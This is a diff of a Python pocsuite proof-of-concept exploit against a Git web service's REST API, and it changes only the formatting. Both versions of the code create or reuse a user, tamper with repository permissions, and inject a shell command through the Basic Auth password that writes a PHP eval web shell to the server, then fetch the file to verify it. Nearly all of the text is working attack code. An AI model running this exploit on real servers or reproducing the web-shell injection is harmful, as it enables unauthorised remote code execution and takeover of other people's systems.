@@ -1,8 +1,14 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-from pocsuite.api.poc import register,Output, POCBase
+from pocsuite.api.poc import register, Output, POCBase
 from requests.auth import HTTPBasicAuth
-import requests,urlparse,random,os,sys,hashlib,string
+import requests
+import urlparse
+import random
+import os
+import sys
+import hashlib
+import string
 
 
 class TestPOC(POCBase):
@@ -31,10 +37,10 @@ class TestPOC(POCBase):
         port = urlparse.urlparse(target).port
         if port is None:
             target = target+":80"
-        repository = ''.join(random.sample(string.digits+string.ascii_letters,4))
-        username = ''.join(random.sample(string.digits+string.ascii_letters,4))
-        password = ''.join(random.sample(string.digits+string.ascii_letters,4))
-        csrf_token = ''.join(random.sample(string.digits+string.ascii_letters,4))
+        repository = ''.join(random.sample(string.digits+string.ascii_letters, 4))
+        username = ''.join(random.sample(string.digits+string.ascii_letters, 4))
+        password = ''.join(random.sample(string.digits+string.ascii_letters, 4))
+        csrf_token = ''.join(random.sample(string.digits+string.ascii_letters, 4))
         user_list = []
         r_getuser = requests.get("{}/rest/user/".format(target))
         try:
@@ -45,19 +51,25 @@ class TestPOC(POCBase):
         if len(user_list) > 0:
             username = user_list[0]
         else:
-            r_create_user = requests.post("{}/rest/user/".format(target),data={'username' : username, 'password' : password})
+            r_create_user = requests.post("{}/rest/user/".format(target),
+                                          data={'username': username, 'password': password})
         r_getrepo = requests.get("{}/rest/repository/".format(target))
         repository_list = r_getrepo.json()
         if len(repository_list) > 0:
             repository = repository_list[0]['name']
-        r_post_csrftoken = requests.post("{}/rest/repository/".format(target), cookies={'csrftoken' : csrf_token}, data={'name' : repository, 'csrfmiddlewaretoken' : csrf_token})
-        r_create_user = requests.post("{}/rest/repository/{}/user/{}/".format(target, repository, username))
-        r_del_user = requests.delete("{}/rest/repository/{}/user/{}/".format(target, repository, "everyone"))
-        random_file_name = ''.join(random.sample(string.ascii_letters+string.digits,16))+".php"
-        random_identify_code = ''.join(random.sample(string.ascii_letters+string.digits,35))
-        random_shell_pass = ''.join(random.sample(string.ascii_letters+string.digits,5))
-        webshell = 'p && echo " <?php @eval($_POST['+random_shell_pass+']);echo"'+random_identify_code+'";?>" > c:'
-        r_create_file = requests.get('{}/web/index.php?p={}.git&a=summary'.format(target, repository), auth=HTTPBasicAuth(username, "{}".format(webshell)+random_file_name))
+        r_post_csrftoken = requests.post("{}/rest/repository/".format(target), cookies={
+                                         'csrftoken': csrf_token}, data={'name': repository, 'csrfmiddlewaretoken': csrf_token})
+        r_create_user = requests.post(
+            "{}/rest/repository/{}/user/{}/".format(target, repository, username))
+        r_del_user = requests.delete(
+            "{}/rest/repository/{}/user/{}/".format(target, repository, "everyone"))
+        random_file_name = ''.join(random.sample(string.ascii_letters+string.digits, 16))+".php"
+        random_identify_code = ''.join(random.sample(string.ascii_letters+string.digits, 35))
+        random_shell_pass = ''.join(random.sample(string.ascii_letters+string.digits, 5))
+        webshell = 'p && echo " <?php @eval($_POST['+random_shell_pass+']);echo"' + \
+            random_identify_code+'";?>" > c:'
+        r_create_file = requests.get('{}/web/index.php?p={}.git&a=summary'.format(
+            target, repository), auth=HTTPBasicAuth(username, "{}".format(webshell)+random_file_name))
         test_url = target+"/web/"+random_file_name
         r_attack = requests.get(test_url)
         if (r_attack.status_code == 200):
